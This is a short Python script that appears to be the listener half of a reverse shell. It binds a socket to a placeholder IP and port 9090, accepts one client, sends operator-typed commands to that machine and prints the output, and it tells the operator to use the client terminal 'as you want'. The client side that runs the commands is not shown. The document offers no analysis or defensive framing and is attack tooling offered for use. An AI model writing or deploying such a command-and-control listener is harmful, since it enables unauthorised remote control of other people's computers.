import socket as sk

HOST = "YOUR-IP"
PORT = 9090
ADDR = (HOST, PORT)
FORMAT = "utf-8"

server = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
server.bind(ADDR)

server.listen(1)
client, addr = server.accept()

print(f"[ CONNECTED ] [ CLIENT IP IS {addr} ] ")
print("[ USE THE CLIENT TERMINAL AS YOU WANT ]")

CONNECTED = True

try:
    while CONNECTED:
        cmd_raw = input("> ")

        if not cmd_raw.strip():
            print("[ EMPTY COMMAND IGNORED ]")
            continue  

        cmd = cmd_raw.encode(FORMAT)
        client.send(cmd)

        if cmd_raw == "!QUIT":
            print(f"[ DISCONNECTED FROM THE CLIENT({addr}) ]")
            CONNECTED = False
            break 

        rsp = client.recv(4096).decode(FORMAT)
        print(rsp)

except:
    print("[ NO CONNECTION TO THE CLIENT ]")
    CONNECTED = False

finally:
    client.close()
    server.close()

